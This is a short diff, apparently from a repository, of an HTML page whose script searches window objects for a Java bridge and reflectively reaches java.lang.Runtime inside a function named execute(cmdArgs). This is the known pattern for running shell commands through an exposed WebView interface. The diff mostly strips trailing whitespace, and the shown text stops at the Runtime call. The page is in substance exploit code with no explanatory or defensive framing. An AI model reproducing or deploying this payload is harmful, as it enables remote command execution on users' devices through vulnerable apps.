@@ -2,26 +2,25 @@
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <script>  
-      var i=0;  
+      var i=0;
       function getContents(inputStream)  
-      {  
-        var contents = ""+i;  
-        var b = inputStream.read();  
-        var i = 1;  
+      {
+        var contents = ""+i;
+        var b = inputStream.read();
         while(b != -1) {  
             var bString = String.fromCharCode(b);  
             contents += bString;  
             contents += "\n"  
-            b = inputStream.read();  
-        }  
+            b = inputStream.read();
+        }
         i=i+1;
         return contents;
        }  
-        
+
        function execute(cmdArgs)  
-       {  
+       {
         for (var obj in window) {  
-            console.log(obj);  
+            console.log(obj);
             if ("getClass" in window[obj]) {  
                 alert(obj);  
                 return window[obj].getClass().forName("java.lang.Runtime").  
